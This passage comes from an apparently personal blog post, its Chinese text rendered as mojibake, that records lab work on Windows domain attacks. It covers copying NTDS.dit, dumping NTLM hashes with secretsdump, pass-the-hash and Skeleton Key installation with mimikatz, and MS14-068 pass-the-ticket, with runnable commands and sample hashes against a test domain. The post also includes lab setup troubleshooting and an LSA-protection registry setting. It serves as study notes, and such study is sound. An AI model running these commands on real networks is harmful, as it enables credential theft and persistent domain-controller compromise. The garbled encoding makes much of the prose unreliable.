<p>é€šè¿‡wmiå¯¹Shadowcopyè¿›è¡Œæ§åˆ¶ï¼Œnishangé‡Œæœ‰<a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1">powershellç‰ˆæœ¬</a></p>

<h4 id="12-é€šè¿‡ninjacopyè·å¾—åŸŸæ§æœåŠ¡å™¨ntdsditæ–‡ä»¶">1.2 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">é€šè¿‡NinjaCopyè·å¾—åŸŸæ§æœåŠ¡å™¨NTDS.ditæ–‡ä»¶</a></h4>

<p>powershell è¿è¡Œè„šæœ¬å¤±è´¥ï¼Œè¯­æ³•é”™è¯¯ï¼Œå¾…ç ”ç©¶ã€‚</p>

<h4 id="13-å¦‚ä½•ä»ntdsditæ–‡ä»¶ä¸­è·å–å…³é”®ä¿¡æ¯">1.3 <a href="https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/">å¦‚ä½•ä»NTDS.ditæ–‡ä»¶ä¸­è·å–å…³é”®ä¿¡æ¯</a></h4>

<h5 id="131-è·å–å„ä¸ªç”¨æˆ·çš„ntlmçš„hashå€¼">1.3.1 è·å–å„ä¸ªç”¨æˆ·çš„NTLMçš„hashå€¼</h5>

<p>é¦–å…ˆï¼Œéœ€è¦åˆ©ç”¨system hiveæ–‡ä»¶ç ´è§£ntds.ditæ–‡ä»¶ï¼Œä½¿ç”¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨ç›´æ¥å¯¼å‡ºçš„regæ–‡ä»¶æ— æ³•ç”¨äºç ´è§£ï¼Œéœ€è¦äºŒè¿›åˆ¶æ ¼å¼çš„system hiveæ–‡ä»¶ã€‚è·å–æ–¹æ³•å¦‚ä¸‹ï¼š</p>

<ul>
  <li>Step 1: è·å–system hiveæ–‡ä»¶
    <blockquote>
      <p>reg export HKLM\System system.reg
reg save HKLM\System system.hiv
The first one can be opened using any text editor; the latter is a full binary dump, and can be opened by loading it in REGEDIT.</p>
    </blockquote>
  </li>
  <li>
    <p>Step 2: å–å¾—å„ä¸ªè´¦å·çš„hashå€¼</p>

    <ul>
      <li>
        <p>Method 1: ä½¿ç”¨Impacket/secretsdump.pyå–å¾—æ‰€æœ‰è´¦æˆ·çš„hashå€¼ 
  <code class="language-plaintext highlighter-rouge">$ python secretdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL</code></p>
      </li>
      <li>
        <p>Method 2: ä½¿ç”¨<a href="https://github.com/libyal/libesedb/releases">esedbexport</a> 
  <code class="language-plaintext highlighter-rouge">/usr/local/bin/esedbexport -m tables ntds.dit</code></p>
      </li>
    </ul>
  </li>
  <li>Step 3: <strong>æœªå®Œæˆ</strong>ç ´è§£hashå€¼
    <ul>
      <li>hashcat kaliè™šæ‹Ÿæœºæ— æ³•ä½¿ç”¨ï¼Œä¼¼ä¹éœ€è¦GPU</li>
    </ul>
  </li>
</ul>

<h5 id="132-ä½¿ç”¨ntdsxtractè·å–åŸŸåä¿¡æ¯">1.3.2: ä½¿ç”¨ntdsxtractè·å–åŸŸåä¿¡æ¯</h5>

<ul>
  <li>Step 1ï¼š å®‰è£…</li>
</ul>

<blockquote>
  <p>$ wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz</p>

  <p>$ tar xf libesedb-experimental-20170121.tar.gz</p>

  <p>$ cd libesedb-20170121/</p>
</blockquote>

<ul>
  <li>Step 2: æ ¹æ®ç¬¬ä¸€æ­¥å¾—åˆ°çš„è¡¨æ ¼ï¼Œé€šè¿‡dsuser.pyè„šæœ¬å¾—åˆ°åŸŸåç›¸å…³ä¿¡æ¯
    <blockquote>
      <table>
        <tbody>
          <tr>
            <td>dsusers.py ../test/ntds.dit.export/datatable.3 ../test/ntds.dit.export/link_table.5 output â€“syshive ../test/system.hiv â€“passwordhashes â€“pwdformat ocl â€“ntoutfile ntout â€“lmoutfile lmout</td>
            <td>tee all_user_info.txt</td>
          </tr>
        </tbody>
      </table>
    </blockquote>
  </li>
</ul>

<h3 id="2-åŸŸæ¸—é€pass-the-hashçš„å®ç°">2. <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/">åŸŸæ¸—é€â€”â€”Pass The Hashçš„å®ç°</a></h3>

<p><strong>Principle</strong>: Attacker use latent NTLM hash instead of plaintext password to authenticate to a remote server.</p>

<p>å¸¸ç”¨å·¥å…·ï¼š</p>

<p>2.1 Kali:
	- meterpreter
	- Tool: pass the hash
2.2 windows
	- python: <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py">wmiexec</a>
	- powershell: <a href="https://github.com/Kevin-Robertson/Invoke-TheHash/">powershell</a>
		- Invoke-WMIExec
		- Invoke-SMBExec
		- Invoke-SMBClient 	 
	- mimikatz: éœ€è¦ç®¡ç†å‘˜æƒé™
		- ä½¿ç”¨pass the ticketä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä½†éœ€è¦å¦ä¸€ä¸ªå·¥å…·<a href="https://github.com/gentilkiwi/kekeo">kekeo</a></p>

<p><a href="http://wooyun.jozxing.cc/static/drops/tips-11631.html">æ•™ç¨‹</a></p>
<h4 id="step-1-è·å–ç”¨æˆ·hashå€¼ç»“æœå¦‚ä¸‹æ‰€ç¤º">Step 1: è·å–ç”¨æˆ·hashå€¼ï¼Œç»“æœå¦‚ä¸‹æ‰€ç¤º</h4>

<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:1dda962106ebf0bd4218bc4d0a78f0c9:::</p>

<table>
  <thead>
    <tr>
      <th>Experiment Information</th>
      <th>Â </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Username</td>
      <td>Administrator</td>
    </tr>
    <tr>
      <td>Domain</td>
      <td>test</td>
    </tr>
    <tr>
      <td>NTLM</td>
      <td>1dda962106ebf0bd4218bc4d0a78f0c9</td>
    </tr>
    <tr>
      <td>AES256</td>
      <td>Â </td>
    </tr>
  </tbody>
</table>

<h4 id="step-2-ä½¿ç”¨mimikatzå®ç°pass-the-hash">Step 2ï¼š ä½¿ç”¨mimikatzå®ç°pass the hash</h4>

<p><strong>Method 1</strong>: ä½¿ç”¨è´¦æˆ·hashå€¼ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œ
<code class="language-plaintext highlighter-rouge">mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:1dda962106ebf0bd4218bc4d0a78f0c9"</code></p>

<p>ä¼šå¼¹å‡ºä¸€ä¸ªcmdï¼Œå¯ä»¥é€šè¿‡<code class="language-plaintext highlighter-rouge">dir \\192.168.139.101\c$</code>å®ç°æŸ¥çœ‹Administratorçš„ä¸»ç›®å½•ï¼Œå…·ä½“å…¶ä»–ç”¨æ³•è¿˜éœ€è¦ç ”ç©¶ã€‚
sekurlsa::pth /user:WORKER1 /domain:test.local /ntlm:2c24919527e360383d7c4cd6c7b0aab0</p>

<p><strong>Method 2</strong>: ä½¿ç”¨AES_Hashå€¼ï¼Œé€‚ç”¨äºå®‰è£…äº†KB2871997è¡¥ä¸çš„ä¸»æœºã€‚[æœªå®ç°]
mimikatz: é€šè¿‡<code class="language-plaintext highlighter-rouge">sekurlsa::ekeys</code>å¯ä»¥æŸ¥çœ‹æœ¬æœºå†…å­˜ä¸­çš„</p>

<p><code class="language-plaintext highlighter-rouge">mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:test.com /aes256:aad4b3c9ed4b3f1ef04b5a69ff326c9bdc8c43214924fac1b96c88ad168891d3" </code></p>

<p>sekurlsa::pth /user:krbtgt /domain:test.local /aes256:159ee14fd120960a157b04dd92d1d4ba3debdf859834e76ea0d3f62cb4cf6ac1</p>

<p>ç”¨<code class="language-plaintext highlighter-rouge">mimikatz "sekurlsa::ekeys"</code>ï¼Œå‘ç°Administratorè´¦æˆ·æ²¡æœ‰AES256å€¼ã€‚
å¾…ç ”ç©¶ï¼Œä¼¼ä¹éœ€è¦æ–°å»ºä¸€ä¸ªç®¡ç†å‘˜æƒé™ï¼ŒåŸæœ¬è‡ªå¸¦Administratoræœ‰å®‰å…¨é—®é¢˜éœ€è¦ç¦ç”¨ã€‚</p>

<p><code class="language-plaintext highlighter-rouge">dir \\DCServer\c$</code>
<code class="language-plaintext highlighter-rouge">copy sn.txt \\DCServer\c$</code>
<code class="language-plaintext highlighter-rouge">net use</code></p>

<p>è®¡ç®—æœºç®¡ç†-&gt;å…±äº«æ–‡ä»¶å¤¹-&gt;å…±äº«</p>

<h4 id="åŸŸä¸­å„ä¸ªè´¦å·çš„æ„ä¹‰å’Œæƒé™">åŸŸä¸­å„ä¸ªè´¦å·çš„æ„ä¹‰å’Œæƒé™</h4>

<p>Administrator
Guest
krbtgt
DCServer</p>

<h3 id="3-åŸŸæ¸—é€skeleton-key">3. <a href="http://wooyun.jozxing.cc/static/drops/tips-12670.html">åŸŸæ¸—é€â€”â€”Skeleton Key</a></h3>

<h4 id="step-1-å°è¯•åœ¨åŸŸå†…ä¸»æœºä¸åŸŸæœåŠ¡å™¨å»ºç«‹ç½‘ç»œè¿æ¥">Step 1: å°è¯•åœ¨åŸŸå†…ä¸»æœºä¸åŸŸæœåŠ¡å™¨å»ºç«‹ç½‘ç»œè¿æ¥</h4>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">net use \\DCServer.test.com Xjc123 /user:Administrator@test.com</code>
<code class="language-plaintext highlighter-rouge">net use \\DCServer.test.com Xjc123456 /user:Jason@test.com</code>
<code class="language-plaintext highlighter-rouge">dir \\DCServer.test.com\c$</code></p>
</blockquote>

<p>åˆ é™¤å½“å‰è¿æ¥ï¼š<code class="language-plaintext highlighter-rouge">net use * /del /y</code></p>

<h4 id="step-2-åœ¨dcä¸­é€šè¿‡mimikatzå®ç°å®‰è£…skeleton-key">Step 2: åœ¨DCä¸­é€šè¿‡mimikatzå®ç°å®‰è£…skeleton key</h4>

<blockquote>
  <p>privilege::debug
misc::skeleton</p>
</blockquote>

<p>mimikatzçš„é»˜è®¤Skeleton Keyè®¾ç½®ä¸ºmimikatz</p>

<h4 id="step-3-åœ¨åŸŸå†…ä¸»æœºé€šè¿‡skeleton-keyå®ç°ç”¨ä»»æ„è´¦å·ç™»å½•dc">Step 3: åœ¨åŸŸå†…ä¸»æœºé€šè¿‡skeleton keyå®ç°ç”¨ä»»æ„è´¦å·ç™»å½•DC</h4>

<p>æµ‹è¯•å‘ç°ï¼Œä½¿ç”¨ä»»æ„è´¦å·éƒ½èƒ½å®ç°è®¿é—®åŸŸæ§åˆ¶å™¨</p>

<h4 id="lsaä¿æŠ¤">LSAä¿æŠ¤</h4>

<p>ã€ä¼¼ä¹åœ¨windows 2008æ²¡ç”¨ã€‘Step 1: è®¾ç½®LSAä¿æŠ¤
æ³¨å†Œè¡¨ä½ç½®ï¼š<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code></p>

<p>æ–°å»º-DWORDå€¼ï¼Œåç§°ä¸ºRunAsPPL,æ•°å€¼ä¸º00000001</p>

<h3 id="3-åŸŸæ¸—é€dump-clear-text-password-after-kb2871997-installed">3. <a href="http://drops.xmd5.com/static/drops/papers-16818.html">åŸŸæ¸—é€â€”â€”Dump Clear-Text Password after KB2871997 installed</a></h3>

<h3 id="4-åŸŸæ¸—é€pass-the-ticket">4. <a href="http://wooyun.jozxing.cc/static/drops/tips-12159.html">åŸŸæ¸—é€â€”â€”Pass The Ticket</a></h3>

<p>æ¼æ´ï¼šMS14-068
å·¥å…·ï¼š</p>
<ol>
  <li>PyKEK</li>
  <li>kekeo</li>
  <li></li>
</ol>

<hr />

<h3 id="é—®é¢˜æ€»ç»“">é—®é¢˜æ€»ç»“</h3>
<ol>
  <li>
    <p>Windows Server å»ºç«‹åŸŸç¯å¢ƒå’ŒDNSæœåŠ¡å™¨åä½¿ç”¨<code class="language-plaintext highlighter-rouge">nslookup</code>	æ—¶æ˜¾ç¤º<code class="language-plaintext highlighter-rouge">DNS Server timed out</code>:</p>

    <p><a href="https://www.youtube.com/watch?v=-34CkgCAk4g">è§£å†³æ–¹æ³•</a>:åœ¨DNSåå‘æŸ¥æ‰¾é‡Œæ–°å»ºåŒºåŸŸï¼Œå¹¶æ–°å»ºæŒ‡é’ˆï¼ŒæŒ‡å‘DNSæœåŠ¡å™¨ã€‚</p>
  </li>
  <li>
    <p>Windows Server é…ç½®é™æ€IPåœ°å€å’ŒDNSæœåŠ¡å™¨æ—¶è¾“å…¥å®Œé»˜è®¤DNSæœåŠ¡å™¨IPåœ°å€ä¼šé»˜è®¤å˜æˆç©ºï¼š</p>

    <p>è§£å†³æ–¹æ³•ï¼šè®¾ç½®ä¸ºè‡ªåŠ¨è·å–IPåœ°å€ï¼Œå†é‡æ–°è®¾ç½®ä¸ºé™æ€IPå³å¯è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
  </li>
  <li>
    <p>Windows Server é«˜çº§å…±äº«è®¾ç½®ï¼Œæ— æ³•å¯ç”¨ç½‘ç»œå‘ç°ï¼š</p>

    <p><a href="http://blog.51cto.com/46562434/1156582">è§£å†³æ–¹æ³•</a>ï¼š
 å…ˆæ£€æŸ¥æ˜¯å¦å‘ç”Ÿé—®é¢˜2ä¸­çš„æƒ…å†µï¼Œå†æ£€æŸ¥æ˜¯å¦å¯ç”¨æœåŠ¡ï¼š</p>
    <ul>
      <li>Function Discovery Resource Publication</li>
      <li>SSDP Discovery</li>
      <li>UPnP Device Host</li>
    </ul>
  </li>
  <li>
    <p>ã€ç»ˆæ­¢ï¼Œå› ä¸ºè¦é’±ã€‘åœ¨å®‰è£…ATAçš„è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼š</p>

    <ul>
      <li>
        <p>åœ¨Windows 2008 R2 Enterpriseä¸­å®‰è£….Net Framework 4.6.1ä¸€ç›´å¤±è´¥ï¼Œæ‰¾åˆ°è§£å†³é—®é¢˜çš„åŠæ³•ï¼š<a href="https://community.spiceworks.com/topic/2094646-net-4-5-2-install-fails-on-vm-server-2008-r2-sp1">æ¥æº</a></p>

        <p>ä¸‹è½½offlineçš„.Net 4.6.1çš„å®‰è£…åŒ…ï¼Œç”¨<a href="https://www.codetwo.com/kb/msi-from-exe/">æŸç§æŠ€å·§</a>æå–exeä¸­çš„msiæ–‡ä»¶ï¼Œæˆ‘ä½¿ç”¨7-zipè½¯ä»¶æå–ï¼Œæ‰¾åˆ°<code class="language-plaintext highlighter-rouge">netfx_Full_x64</code>æ–‡ä»¶å³å¯å®Œæˆå®‰è£…ç»•è¿‡æ£€æŸ¥ã€‚</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Hashcatæ— æ³•ä½¿ç”¨</p>
  </li>
</ol>

<blockquote>
  <p>clGetDeviceIDs(): CL_DEVICE_NOT_FOUND</p>

  <p>clGetDeviceIDs(): CL_DEVICE_NOT_FOUND</p>

  <p>No devices found/left.</p>
</blockquote>

  </section>
<!-- <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script> -->
</article>

<section>
       <ul class="pager">
        
        <li class="previous">
            <a href="/2018/08/IP_Command/" data-toggle="tooltip" data-placement="top" title="IP Command">Last Blogï¼š  <span>IP Command</span>
            </a>
        </li>
        
        
        <li class="next">
            <a href="/2018/10/Windows_Hash_Achievement_via_VSS/" data-toggle="tooltip" data-placement="top" title="Windows Hash Achievement via VSS">Next Blogï¼š  <span>Windows Hash Achievement via VSS</span>
            </a>
        </li>
        
    </ul>
</section>

<section class="post-comments">
<div id="disqus_thread"></div>
  <script type="text/javascript">
    var disqus_config = function () {
      // Here is an example,
      this.page.url = "https://c0ldstudy.github.io/2018/09/Permeation_Skills/";
      this.page.identifier = "/2018/09/Permeation_Skills/";
    };

    // You should be able to get the following lines of code from your Disqus admin.
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = '//c0ldstudy-github-io.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>
    Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
  </noscript>
</section>


            <section class="footer">
    <footer>
        <div class = "footer_div">
          <div clas="recordings" style="display:flex;justify-content:space-around;">
          <div class="twitter_display">
            <div class='jekyll-twitter-plugin'><a class="twitter-timeline" data-width="300" data-tweet-limit="1" href="https://twitter.com/JiacenXu?ref_src=twsrc%5Etfw">Tweets by JiacenXu</a>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</div>
          </div>
          <div class="github_chart">
            <img src="http://ghchart.rshah.org/409ba5/C0ldstudy" alt="C0ldstudy's Blue Github chart"/>
            <script type='text/javascript' id='clustrmaps' src='//cdn.clustrmaps.com/map_v2.js?cl=ffffff&w=400&t=n&d=PWaejm3rz2TG6HOtwcekX2kM9kPWz2aP6GYhuOVoNpA&co=2d78ad&cmo=3acc3a&cmn=ff5353&ct=ffffff'></script>
          </div>
        </div>
            <nav class="cover-navigation navigation--social">
            <ul class="navigation">
          
          <!-- Github -->
          <li class="navigation__item_social">
            <a href="https://github.com/c0ldstudy" title="@c0ldstudy çš„ Github" target="_blank">
              <i class='fab fa-github fa-2x'></i>
              <span class="label">Github</span>
            </a>
          </li>
          
          
          <!-- Twitter -->
          <li class="navigation__item_social">
            <a href="https://twitter.com/JiacenXu" title="@JiacenXu" target="_blank">
              <i class='fab fa-twitter fa-2x'></i>
              <span class="label">Twitter</span>
            </a>
          </li>
          

          
          <!-- LinkedIn -->
          <li class="navigation__item_social">
            <a href="https://www.linkedin.com/in/jiacen-xu-021536105/" title="@jiacen-xu-021536105" target="_blank">
              <i class='fab fa-linkedin fa-2x'></i>
              <span class="label">LinkedIn</span>
            </a>
          </li>
          
          

          <!-- RSS -->
          <li class="navigation__item_social">
            <a href="/feed.xml" rel="author" title="RSS" target="_blank">
              <i class='fa fa-rss fa-2x'></i>
              <span class="label">RSS</span>
            </a>
          </li>

          
          <!-- Email -->
          <li class="navigation__item_social">
            <a href="mailto:coldstudyxu@gmail.com" title="Contact me">
              <i class='fa fa-envelope fa-2x'></i>
              <span class="label">Email</span>
            </a>
          </li>
          
          </ul>
        </nav>
        </div>

        <div class = "footer_div_counter">
           <p class="copyright text-muted">
            Copyright &copy; Jason Xu 2022 Theme by <a href="http://c0ldstudy.github.io/">C0ldstudy</a> |
            <iframe
                style="margin-left: 2px; margin-bottom:-5px;"
                frameborder="0" scrolling="0" width="91px" height="20px"
                src="https://ghbtns.com/github-btn.html?user=c0ldstudy&repo=c0ldstudy.github.io&type=star&count=true" >
            </iframe>
            </p>
        	<div align="right">
    			<!-- <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css"> -->
          <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

          <!-- è®¿é—®ç»Ÿè®¡ -->
          <span id="busuanzi_container_site_uv" style='display:none'>
          <span id="busuanzi_value_site_uv"></span> People Visited!
          </span>
        </div>
        </div>
    </footer>
</section>

        </div>
    </div>

    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="/js/main.js"></script>

<script type="text/javascript" src="/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>




  </body>

</html>
